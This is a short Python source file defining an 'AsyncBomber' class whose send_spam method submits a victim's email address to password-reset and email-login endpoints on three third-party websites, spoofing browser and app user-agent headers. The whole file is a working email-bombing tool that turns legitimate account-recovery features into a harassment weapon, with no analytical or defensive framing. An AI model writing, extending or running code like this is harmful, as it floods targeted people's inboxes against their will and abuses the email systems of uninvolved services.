import aiohttp,asyncio
class AsyncBomber():
	def __init__(self):
		self.session = aiohttp.ClientSession()
		self.headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36","x-requested-with": "XMLHttpRequest"}
	def __del__(self):
		try:
		          loop = asyncio.get_event_loop()
		          loop.create_task(self._close_session())
		except RuntimeError:
		          loop = asyncio.new_event_loop()
		          loop.run_until_complete(self._close_session())
	async def _close_session(self):
		if not self.session.closed: await self.session.close()
	async def send_spam(self,email):
		await self.session.post('https://api.newmanga.org/v2/forgot_password',json={"credentials":email},headers=self.headers)
		await self.session.post("https://anitype.site/app2/auth/email/send",json={"redirect":"https://anitype.fun/auth/email","email":email},headers=self.headers)
		await self.session.post("https://internal.intellect.co/api/user/auth/password/forgot/request",json= {"email": email},headers={"content-type": "application/json","accept": "application/json","user-agent": "okhttp/3.12.1"})